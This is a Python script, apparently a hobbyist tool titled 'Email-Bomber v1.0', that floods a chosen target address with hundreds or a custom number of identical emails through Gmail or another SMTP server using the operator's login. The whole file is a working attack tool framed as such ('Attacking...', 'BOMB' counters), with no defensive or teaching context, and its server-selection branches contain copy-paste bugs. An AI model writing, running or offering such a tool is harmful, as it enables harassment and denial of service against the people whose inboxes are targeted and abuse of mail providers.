# Create email bomber

""" Imports """
import smtplib
import sys
import os


# Define colors for different instances
class bcolours():
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


# Define a banner for the program
def banner():
    print(bcolours.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolours.GREEN + '+[+[+[ Made with colours ]+]+]+')
    print(bcolours.GREEN + '''
						 /|/
						   `--+--'
						      |
						  ,--'#`--.
						  /#######/
					   _.-'#######'-._
					,-'###############'-.
				  ,'#####################`,
				 /#########################/			.___     .__        .
				/###########################/			[__ ._ _ [__) _ ._ _ |_  _ ._.
			   /#############################/			[___[ | )[__)(_)[ | )[_)(/,[
			   /##############################/ 
			   /#############################/ 					Author: Djing@254
			    /############################/
			     /##########################/
			      `.######################,'
			        `.##################,'
			          `._############_,'							 
						 `--..###..--'								,-.--.
		*.________________________________________________________,'(Bomb)
																	 `--'  ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolours.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolours.GREEN + 'Enter target email <: '))
            self.mode = int(input(bcolours.GREEN + 'Enter BOMB Mode (1,2,3,4) // 1:(1000) 2(500) 3(250) 4(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('Error: Invalid Input')
                sys.exit(1)
        except Exception as e:
            print(f'Error: {e}')

    def bomb(self):
        try:
            print(bcolours.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolours.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolours.RED + f'\n+[+[+[ You have selected mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolours.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(
                bcolours.GREEN + 'Enter email server / or select premade options - 1:Gmail 2:Yahoo 3:Outlook 4:Hotmail <: '))
            premade = ['1', '2', '3', '4']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolours.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = "smtp.yahoo.com"
            elif self.server == '2':
                self.server = "smtp.outlook.com"
            elif self.server == '2':
                self.server = "smtp.hotmail.com"
            # else:
            self.fromAddr = str(input(bcolours.GREEN + 'Enter from address<: '))
            self.fromPwd = str(input(bcolours.GREEN + 'Enter from password<: '))
            self.subject = str(input(bcolours.GREEN + 'Enter subject<: '))
            self.message = str(input(bcolours.GREEN + 'Enter message<: '))

            self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
			''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f"ERROR: {e}")

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolours.YELLOW + f'BOMB: {self.count}')

        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolours.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(bcolours.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
